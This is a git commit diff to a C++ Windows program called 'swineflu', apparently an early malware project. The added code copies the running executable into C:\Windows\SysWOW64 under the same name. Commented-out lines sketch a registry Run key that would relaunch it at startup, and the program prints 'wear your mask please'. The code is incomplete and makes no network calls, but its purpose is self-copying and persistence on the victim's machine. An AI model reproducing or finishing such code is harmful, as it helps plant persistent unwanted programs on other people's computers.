0db6bbeacb7ca9da002998ada64c0c083b40454a
Kate <ksbox12@gmail.com>
2015-01-14 16:33:06 +0200

    withfilemove

--- swineflu/swineflu.cpp
+++ swineflu/swineflu.cpp
@@ -2,17 +2,65 @@
 //
 
 #include "stdafx.h"
+#include <windows.h>
+#include <string.h>
 
-void adminpriv()
+#include <sstream>
+#include <string>
+
+#include "Shlwapi.h"
+#include <string>
+
+
+#include <iostream>
+
+using namespace std;
+
+
+string ExePath() {
+	char buffer[MAX_PATH];
+	GetModuleFileName(NULL, buffer, MAX_PATH);
+	string::size_type pos = string(buffer).find_last_of("\\/");
+	return string(buffer).substr(0, pos);
+}
+
+void adminstartup()
 {
-	printf("admin method called");
+	string str = ExePath();
+	printf(str.c_str());
+	str.append("\\swineflu.exe");
+//CopyFile(L"SwineFlu.exe", L"C:\\Windows\\SwineFlu.dll", true);
+	//TCHAR path[MAX_PATH] = { 0 };
+	//GetModuleFileName(NULL, path, MAX_PATH);
+	//PathRemoveFileSpec(path);
+	//PathAppend(path, _T("SwineFlu.exe"));
+
+	BOOL b = CopyFile(str.c_str(),
+		"C:\\Windows\\SysWOW64\\swineflu.exe", 0);
+	if (!b) {
+
+		
+		
+		printf("%d/n", GetLastError());
+	}
+	else {
+		printf("okay/n");
+	}
+
+	HKEY hkey;
+	DWORD dwDispoition;
+
+	//RegOpenKeyEx(HKEY_LOCAL_MACHINE, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_ALL_ACCESS, &hkey);
+	//const unsigned char path[150] = "C:\\Windows\\myprogram.exe";
+	//RegSetValueEx(hkey, L"My Directory", 0, 1, path, sizeof(path));
+	getchar();
 }
 
 
 int _tmain(int argc, _TCHAR* argv[])
 {
 	printf("wear your mask please\n");
-	adminpriv();
+	adminstartup();
 	return 0;
 }
 
